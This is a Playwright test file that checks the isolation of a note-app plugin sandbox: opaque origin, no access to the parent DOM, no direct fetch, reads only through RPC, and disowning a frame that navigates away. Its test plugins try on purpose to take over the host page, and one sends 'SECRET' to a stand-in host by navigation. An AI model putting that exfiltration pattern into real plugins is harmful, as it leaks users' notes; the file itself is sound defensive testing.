import { expect, test } from "@playwright/test";

async function readSandboxDocument(): Promise<string> {
  // The variable preserves a native dynamic import under Playwright's CJS loader.
  const moduleName = "@context/obsidian-runtime";
  const runtime = (await import(moduleName)) as {
    pluginSandboxDocument: () => string;
  };
  return runtime.pluginSandboxDocument();
}

/**
 * A real engine proof for the boundary jsdom cannot enforce: the plugin frame
 * has an opaque origin, cannot reach the parent DOM, cannot fetch directly,
 * and can still read through the one RPC door the trusted host answers.
 */
test("a plugin has no ambient authority and reaches notes only through RPC", async ({
  page,
}) => {
  const sandboxDocument = await readSandboxDocument();
  await page.setContent("<main id=host>trusted</main>");
  await page.evaluate((srcdoc) => {
    const received: unknown[] = [];
    (window as Window & { sandboxMessages?: unknown[] }).sandboxMessages =
      received;
    const nonce = "browser-proof-nonce";
    const frame = document.createElement("iframe");
    frame.id = "plugin";
    frame.setAttribute("sandbox", "allow-scripts");
    frame.srcdoc = srcdoc;
    window.addEventListener("message", (event) => {
      if (event.source !== frame.contentWindow) return;
      const message = event.data as Record<string, unknown>;
      received.push(message);
      if (message.type === "ready") {
        frame.contentWindow?.postMessage(
          {
            source: "context-plugin-host",
            version: 1,
            nonce,
            type: "load",
            manifestJson: JSON.stringify({
              id: "proof",
              name: "Proof",
              version: "1",
            }),
            mainJs: `
            const { Plugin, Notice } = require("obsidian");
            module.exports = class Proof extends Plugin {
              async onload() {
                let parentBlocked = false;
                try { parent.document.querySelector("#host").textContent = "owned"; } catch (_) { parentBlocked = true; }
                let networkBlocked = false;
                try { await fetch("https://example.com/private"); } catch (_) { networkBlocked = true; }
                const target = { path: "1-projects/proof.md" };
                const text = await this.app.vault.read(target);
                new Notice(JSON.stringify({ parentBlocked, networkBlocked, text }));
              }
            };
          `,
          },
          "*",
        );
      }
      if (message.type === "rpc") {
        const request = message.request as { requestId: string };
        frame.contentWindow?.postMessage(
          {
            source: "context-plugin-host",
            version: 1,
            type: "rpc-result",
            response: {
              version: 1,
              requestId: request.requestId,
              ok: true,
              result: {
                kind: "file",
                text: "# Through the broker",
                etag: "one",
              },
            },
          },
          "*",
        );
      }
    });
    document.body.appendChild(frame);
  }, sandboxDocument);

  await expect
    .poll(async () =>
      page.evaluate(() => {
        const messages =
          (
            window as Window & {
              sandboxMessages?: Array<Record<string, unknown>>;
            }
          ).sandboxMessages ?? [];
        return messages.some((message) => message.type === "loaded");
      }),
    )
    .toBe(true);
  const proof = await page.evaluate(() => {
    const messages =
      (window as Window & { sandboxMessages?: Array<Record<string, unknown>> })
        .sandboxMessages ?? [];
    const notice = messages.find((message) => message.type === "notice") as {
      message: string;
    };
    return {
      host: document.querySelector("#host")?.textContent,
      sandbox: document.querySelector("#plugin")?.getAttribute("sandbox"),
      notice: JSON.parse(notice.message),
      rpc: messages.find((message) => message.type === "rpc"),
    };
  });
  expect(proof.host).toBe("trusted");
  expect(proof.sandbox).toBe("allow-scripts");
  expect(proof.notice).toEqual({
    parentBlocked: true,
    networkBlocked: true,
    text: "# Through the broker",
  });
  expect(proof.rpc).toMatchObject({
    request: { operation: { kind: "vault.read", path: "1-projects/proof.md" } },
  });
});

test("the browser gives the frame an opaque origin", async ({ page }) => {
  const sandboxDocument = await readSandboxDocument();
  await page.setContent("<main>host</main>");
  await page.evaluate((srcdoc) => {
    const frame = document.createElement("iframe");
    frame.id = "plugin";
    frame.setAttribute("sandbox", "allow-scripts");
    frame.srcdoc = srcdoc;
    document.body.appendChild(frame);
  }, sandboxDocument);
  const frame = page.locator("#plugin");
  await expect(frame).toHaveAttribute("sandbox", "allow-scripts");
  expect(await frame.getAttribute("sandbox")).not.toContain(
    "allow-same-origin",
  );
});

/**
 * The frame is only ours for one load, and the second one gets nothing.
 *
 * `sandbox="allow-scripts"` denies the frame the parent's DOM and the CSP
 * denies it `fetch`, workers, images and forms — but no sandbox flag and no
 * shipping CSP directive stops a document navigating *itself*
 * (`allow-top-navigation` governs the top-level context, and `navigate-to` was
 * removed from the spec). So the frame can stop being the document we wrote,
 * and the host has to notice rather than assume.
 *
 * The signal is the load event, and it is exact rather than heuristic: the
 * srcdoc document is written once and never re-set, so a second `load` on the
 * same element means the frame is no longer ours. `sandboxFrameIsOurs` is the
 * whole rule, imported here rather than restated, so weakening it in the
 * package fails this test as well as the component that calls it.
 *
 * What must not reach the successor document: the sandbox nonce, the bundle,
 * and any answer to an `rpc` it sends — because `event.source` still equals
 * `frame.contentWindow` after a navigation, so identity alone no longer
 * distinguishes it.
 *
 * jsdom cannot prove any of this: it does not navigate, and it does not
 * enforce iframe sandboxing at all.
 */
test("a frame that navigates away is disowned rather than re-served", async ({
  page,
}) => {
  const sandboxDocument = await readSandboxDocument();
  const moduleName = "@context/obsidian-runtime";
  const runtime = (await import(moduleName)) as {
    sandboxFrameIsOurs: (loads: number) => boolean;
  };
  const guardSource = runtime.sandboxFrameIsOurs.toString();

  // A page on this origin the frame can navigate to, standing in for anywhere
  // a plugin might send what it has read. It records what the host posts next.
  await page.route("**/successor*", (route) =>
    route.fulfill({
      contentType: "text/html",
      body: "<script>window.__fromHost=[];addEventListener('message',e=>window.__fromHost.push(e.data))</script>",
    }),
  );
  await page.route("https://sandbox-host.invalid/", (route) =>
    route.fulfill({ contentType: "text/html", body: "<main id=host>trusted</main>" }),
  );
  await page.goto("https://sandbox-host.invalid/");

  await page.evaluate(
    ([srcdoc, guard]) => {
      const sandboxFrameIsOurs = eval(`(${guard})`) as (n: number) => boolean;
      const state = { loads: 0, posts: 0, disowned: false, rpcAnswered: 0 };
      (window as Window & { sandboxState?: typeof state }).sandboxState = state;
      const nonce = "disown-proof-nonce";
      const frame = document.createElement("iframe");
      frame.id = "plugin";
      frame.setAttribute("sandbox", "allow-scripts");
      frame.srcdoc = srcdoc;
      frame.addEventListener("load", () => {
        state.loads += 1;
        if (!sandboxFrameIsOurs(state.loads)) {
          state.disowned = true;
          return;
        }
        state.posts += 1;
        frame.contentWindow?.postMessage(
          {
            source: "context-plugin-host",
            version: 1,
            nonce,
            type: "load",
            manifestJson: JSON.stringify({ id: "wanderer", name: "W", version: "1" }),
            mainJs: `
              module.exports = class {
                async onload() {
                  location.href = "https://plugin-successor.invalid/successor?q=" + encodeURIComponent("SECRET");
                }
              };
            `,
          },
          "*",
        );
      });
      window.addEventListener("message", (event) => {
        if (event.source !== frame.contentWindow) return;
        if (state.disowned) return;
        const message = event.data as Record<string, unknown>;
        if (message.type !== "rpc") return;
        state.rpcAnswered += 1;
      });
      document.body.appendChild(frame);
    },
    [sandboxDocument, guardSource] as const,
  );

  await expect
    .poll(async () =>
      page.evaluate(
        () =>
          (window as Window & { sandboxState?: { disowned: boolean } })
            .sandboxState?.disowned ?? false,
      ),
    )
    .toBe(true);

  const state = await page.evaluate(
    () =>
      (
        window as Window & {
          sandboxState?: { loads: number; posts: number; rpcAnswered: number };
        }
      ).sandboxState,
  );
  // The navigation really happened — otherwise this asserts nothing.
  expect(state?.loads).toBe(2);
  // And the successor got exactly one thing from the host: nothing.
  expect(state?.posts).toBe(1);
  expect(state?.rpcAnswered).toBe(0);

  const successor = page
    .frames()
    .find((one) => one.url().includes("/successor"));
  expect(successor, "the frame navigated itself").toBeTruthy();
  expect(
    await successor!.evaluate(
      () => (window as Window & { __fromHost?: unknown[] }).__fromHost ?? [],
    ),
  ).toEqual([]);
  expect(await page.locator("#host").textContent()).toBe("trusted");
});
